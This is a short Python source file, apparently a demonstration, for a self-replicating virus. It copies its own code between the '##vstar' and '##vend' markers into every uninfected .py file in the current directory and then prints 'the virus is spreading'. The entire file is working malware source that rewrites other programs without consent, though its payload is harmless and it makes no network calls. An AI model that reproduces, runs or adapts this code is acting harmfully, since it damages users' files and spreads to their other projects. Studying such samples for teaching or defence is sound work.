#!/user/bin/env python

##vstar
import re, sys, glob
##re: regex, sys: to get the command line argument(the currently running file), glob: linux style pathing/filenames

virus_code = []

##opens a read only version of the program file currently running
this_file = open(sys.argv[0], 'r')
content = this_file.readlines()
this_file.close()

##get only the code for the virus not the other program that it could be running on
vcode = False
for line in content:
    if (re.search('^##vstar', line)):
        vcode = True
    if (vcode):
        virus_code.append(line)
    if (re.search('^##vend', line)):
        break

##find all other .py files
programs = glob.glob('*.py')

##check to see if we have infected, if not infect else move on
for file in programs:
    f = open(file, 'r')
    file_code = f.readlines()
    f.close
    already_infected = False
    for line in file_code:
        if ('##vstar' in line):
            already_infected = True
            break
    if not already_infected:
        new_file_code = []
        ##if it has a #! put that line back on the top of the file
        if ('#!' in file_code[0]):
            new_file_code.append(file_code.pop(0))
        new_file_code.extend(virus_code)
        new_file_code.extend(file_code)
        fi = open(file, 'w')
        fi.writelines(new_file_code)
        fi.close()

##payload
print('the virus is spreading')

##vend
